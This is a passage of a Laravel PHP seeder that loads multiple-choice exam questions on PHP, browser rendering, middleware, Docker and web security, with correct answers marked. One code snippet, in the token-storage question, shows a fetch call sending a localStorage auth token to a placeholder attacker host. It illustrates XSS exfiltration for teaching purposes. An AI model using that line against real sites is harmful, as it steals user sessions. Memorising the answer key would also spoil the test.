                'explanation' => 'match does strict identity comparison (===) rather than loose comparison (==), returns an expression value directly, does not suffer from fall-through (no break statements required), and throws an UnhandledMatchError if no arm matches and default is missing.',
                'options' => [
                    ['text' => 'match performs strict comparison (===), returns an expression value without needing break statements, and throws UnhandledMatchError if unhandled.', 'is_correct' => true],
                    ['text' => 'match uses loose comparison (==) and allows fall-through execution between branches.', 'is_correct' => false],
                    ['text' => 'match can only evaluate boolean expressions, not integers or strings.', 'is_correct' => false],
                    ['text' => 'switch returns a value directly, whereas match requires an explicit return statement inside each branch.', 'is_correct' => false],
                ]
            ],

            // Question 16
            [
                'prompt' => 'In browser rendering engine internals, what is the critical difference between a DOM "Reflow" (Layout calculation) and a "Repaint"?',
                'code_snippet' => "// Operation A
element.style.color = '#10b981';

// Operation B
element.style.width = '350px';
const h = element.offsetHeight;",
                'language' => 'javascript',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'A Reflow (Layout) recalculates geometry, position, and dimensions of elements in the render tree and triggers reflow of descendants and ancestors (very computationally expensive). A Repaint only redraws visual skin/pixels (e.g. color, visibility) without altering geometric dimensions.',
                'options' => [
                    ['text' => 'Reflow recalculates the geometric positions and dimensions of elements across the render tree, whereas Repaint merely redraws pixel styling without changing geometry.', 'is_correct' => true],
                    ['text' => 'Repaint triggers GPU shader recompilation, while Reflow executes in CSS threads.', 'is_correct' => false],
                    ['text' => 'Reflow only affects SVG elements, while Repaint affects HTML div containers.', 'is_correct' => false],
                    ['text' => 'Reading offsetHeight prevents Reflow by reading from cached memory.', 'is_correct' => false],
                ]
            ],

            // Question 17
            [
                'prompt' => 'In the Laravel 11 HTTP request lifecycle, what is the specific operational purpose of implementing the TerminableMiddleware interface (defining a terminate method)?',
                'code_snippet' => "namespace App\Http\Middleware;

class LogTelemetryRequest {
    public function handle(\$request, Closure \$next) {
        return \$next(\$request);
    }

    public function terminate(\$request, \$response): void {
        // Heavy analytics dispatch
    }
}",
                'language' => 'php',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'The terminate() method in terminable middleware executes AFTER the HTTP response has already been sent to the client browser (using fastcgi_finish_request), allowing heavy background tasks (telemetry, log aggregation) to run without delaying response latency to the user.',
                'options' => [
                    ['text' => 'It executes after the HTTP response has already been sent to the client browser, performing post-response cleanup without increasing user response time.', 'is_correct' => true],
                    ['text' => 'It cancels the request if the client disconnects before headers are dispatched.', 'is_correct' => false],
                    ['text' => 'It automatically rolls back any active database transactions if an exception occurs.', 'is_correct' => false],
                    ['text' => 'It shuts down the PHP-FPM worker process to free up memory.', 'is_correct' => false],
                ]
            ],

            // Question 18
            [
                'prompt' => 'From an application security perspective, why must sensitive authentication tokens (like refresh tokens or session keys) NOT be stored in localStorage or sessionStorage in production applications?',
                'code_snippet' => "// Insecure Client Storage
localStorage.setItem('auth_token', jwtToken);

// Accessible via any injected JavaScript:
fetch('https://attacker-c2.com/steal?t=' + localStorage.getItem('auth_token'));",
                'language' => 'javascript',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'localStorage and sessionStorage are fully accessible to ANY JavaScript running on the domain origin. If an XSS vulnerability exists anywhere on the site, malicious scripts can trivially read the storage and exfiltrate tokens. HttpOnly cookies cannot be read by JavaScript.',
                'options' => [
                    ['text' => 'Web Storage is accessible to all client-side JavaScript, making tokens vulnerable to instant exfiltration by any injected XSS payload.', 'is_correct' => true],
                    ['text' => 'localStorage is cleared every time the user refreshes the page.', 'is_correct' => false],
                    ['text' => 'localStorage data is sent with every HTTP request header, causing bandwidth bloat.', 'is_correct' => false],
                    ['text' => 'Browsers encrypt localStorage with a key that rotates every 24 hours.', 'is_correct' => false],
                ]
            ],

            // Question 19
            [
                'prompt' => 'When optimizing Dockerfiles for high-concurrency Laravel/PHP applications, why is multi-stage building combined with copying composer dependencies before copying application code considered best practice?',
                'code_snippet' => "# Dockerfile Snippet
FROM composer:2 AS vendor
WORKDIR /app
COPY composer.json composer.lock ./
RUN composer install --no-dev --optimize-autoloader

FROM php:8.3-fpm-alpine
COPY --from=vendor /app/vendor /var/www/vendor
COPY . /var/www",
                'language' => 'bash',
                'question_type' => 'multiple_choice',
                'points' => 1,
                'explanation' => 'Docker layers are cached. By copying composer.json and composer.lock first and running composer install, the expensive dependency installation layer is only rebuilt when dependencies actually change. Frequent application code modifications re-use the cached vendor layer, drastically speeding up build and deploy pipelines.',
                'options' => [
                    ['text' => 'It leverages Docker layer caching so composer dependencies are only re-downloaded when lockfiles change, while keeping development tools out of the final slim production image.', 'is_correct' => true],
                    ['text' => 'PHP requires vendor packages to be compiled as shared C libraries (.so) during the build stage.', 'is_correct' => false],
                    ['text' => 'It prevents Composer from writing to the host filesystem during testing.', 'is_correct' => false],
                    ['text' => 'Docker does not permit running artisan commands in single-stage containers.', 'is_correct' => false],
                ]
            ],

            // Question 20
            [
                'prompt' => 'What was the foundational architectural purpose of PHP introducing Fibers in modern PHP (PHP 8.1+), and how does it empower asynchronous non-blocking runtimes like Revolt, Amp, and Swoole?',
                'code_snippet' => "\$fiber = new Fiber(function (): void {
    \$value = Fiber::suspend('paused');
    echo \"Resumed with: \$value\";
});

\$status = \$fiber->start(); // Returns 'paused'
\$fiber->resume('active_task');",
                'language' => 'php',
                'question_type' => 'code_output',
                'points' => 1,
                'explanation' => 'Fibers provide full-stack coroutines (cooperative concurrency) allowing execution to be suspended and resumed at arbitrary points without stack loss, enabling event-loop frameworks to write synchronous-looking code while performing non-blocking concurrent I/O.',
                'options' => [
                    ['text' => 'Fibers provide low-level coroutines (cooperative concurrency) enabling execution suspension and resumption without stack disruption, empowering synchronous-looking non-blocking I/O.', 'is_correct' => true],
                    ['text' => 'Fibers run code on separate CPU threads simultaneously utilizing true POSIX kernel pthreads.', 'is_correct' => false],
                    ['text' => 'Fibers replace PHP garbage collection with zero-copy reference counting.', 'is_correct' => false],
                    ['text' => 'Fibers automatically parallelize database queries across multiple MySQL connections.', 'is_correct' => false],
                ]
            ],
        ];

        // Insert questions and options
        foreach ($questionsData as $idx => $qData) {
            $question = $exam->questions()->create([
                'prompt' => $qData['prompt'],
                'code_snippet' => $qData['code_snippet'] ?? null,
                'language' => $qData['language'] ?? 'php',
                'question_type' => $qData['question_type'],
                'points' => $qData['points'],
                'explanation' => $qData['explanation'],
                'sort_order' => $idx + 1,
            ]);

            foreach ($qData['options'] as $optIdx => $opt) {
                $question->options()->create([
                    'option_text' => $opt['text'],
                    'is_correct' => $opt['is_correct'],
                    'sort_order' => $optIdx,
                ]);
            }
        }
    }
}
